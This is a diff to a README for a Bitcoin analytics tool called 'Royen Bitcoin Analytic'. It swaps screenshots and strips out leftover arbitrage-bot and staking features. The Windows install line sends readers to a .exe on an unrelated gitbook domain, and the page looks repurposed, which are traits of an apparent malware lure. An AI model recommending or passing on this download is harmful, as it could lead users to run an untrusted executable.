@@ -9,7 +9,7 @@ Royen Bitcoin Analytic is an open-source, enterprise-grade tool for real-time Bi
 ### Windows
 ## Download the .exe installer from [Releases](https://selenium-finance.gitbook.io/secure-bitcoin-trading/installation-and-setup/windows).
 
-<p align="center"><img width="900" height="600" src="dashboardmempool.png" alt="Bot interface" /></p>
+<p align="center"><img width="900" height="600" src="/botdashboard/alerts.png" alt="Bot interface" /></p>
 
 ## Features
 ### Mempool Monitoring
@@ -25,26 +25,17 @@ Royen Bitcoin Analytic is an open-source, enterprise-grade tool for real-time Bi
 - Network health: Analyze hash rate, mining pool distribution, and HODL Waves.
 - Key metrics: SOPR, MVRV, UTXO age distribution for market sentiment analysis.
 
+<p align="center"><img width="900" height="600" src="/botdashboard/onchain.png" alt="Bot interface" /></p>
+
 ### Integrated Insights
 - Correlation analysis: Combine mempool and on-chain data to identify market signals.
 - Historical trends: Compare current activity with past data (7–30 days).
 - Custom dashboards: Build interactive visualizations.
 
 ### Notifications
-- Supports limit orders, market orders, and conditional orders (e.g., execute if spread >2%).
-- Trailing take-profit and stop-loss orders to lock in profits or limit losses dynamically.
-- Batch order execution for large capital, splitting trades across multiple exchanges to reduce market impact.
-
-### Advanced Risk Management:
 - Custom alerts: Set triggers for large transactions, fee spikes, or exchange flows.
 - Delivery options: Telegram, Discord, email, or desktop push notifications.
 - Priority settings: Filter alerts by urgency or asset size.
-
-### Arbitrage Parameters:
-- Minimum spread threshold (e.g., 0.5–5%) to filter low-profit opportunities.
-- Maximum trade size per transaction (e.g., $100–$100,000) to control risk.
-- Gas fee cap (e.g., $10 max) to avoid unprofitable trades on high-fee networks like Ethereum.
-- Blacklist for risky tokens or illiquid pairs to ensure safe trading.
 
 ### Security & Privacy
 - Tor support: Optional anonymity for network requests.
@@ -52,9 +43,7 @@ Royen Bitcoin Analytic is an open-source, enterprise-grade tool for real-time Bi
 - Offline mode: Analyze cached data without internet access.
 - No wallet integration: No seed phrases or private keys required.
 
-### Passive Income Integration:
-- Automatically stakes idle funds in DeFi protocols (e.g., Curve, Balancer) for 5–20% APY.
-- User-friendly setup for beginners to earn passive income.
+<p align="center"><img width="900" height="600" src="/botdashboard/settings.png" alt="Bot interface" /></p>
 
 ### Extensibility
 - Node integration: Connect to Bitcoin Core, Electrum, or public nodes.
